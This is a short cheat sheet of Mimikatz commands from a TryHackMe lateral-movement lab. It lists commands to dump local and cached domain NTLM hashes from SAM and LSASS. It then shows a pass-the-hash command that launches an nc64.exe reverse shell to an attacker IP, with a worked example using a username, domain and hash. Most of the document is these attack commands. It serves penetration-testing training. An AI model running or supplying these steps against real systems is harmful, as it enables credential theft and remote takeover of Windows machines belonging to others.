# Mimikatz Commands

```
privilege::debug
```
```
token::elevate
```
This method will only allow you to get hashes from local users on the machine. No domain user's hashes will be available:
```
lsadump::sam
```
This method will let you extract any NTLM hashes for local users and any domain user that has recently logged onto the machine.
```
sekurlsa::msv
```

We can then use the extracted hashes to perform a Pass the Hash (PtH) attack by using mimikatz to inject an access token for the victim user on a reverse shell (or any other command you like) as follows:
```
token::revert
```
```
sekurlsa::pth /user:[USERNAME] /domain:[DOMAIN] /ntlm:[HASH] /run:"c:\tools\nc64.exe -e cmd.exe [ATTACK-IP] [PORT]"
```
Example:
```
sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe 10.50.61.3 5555"
```
Notice we used token::revert to reestablish our original token privileges, as trying to pass-the-hash with an elevated token won't work. This would be the equivalent of using runas /netonly but with a hash instead of a password and will spawn a new reverse shell from where we can launch any command as the victim user. Interestingly, if you run the whoami command on this shell, it will still show you the original user you were using before doing PtH, but any command run from here will actually use the credentials we injected using PtH.

**********************************************************************

## Reference

* https://tryhackme.com/room/lateralmovementandpivoting
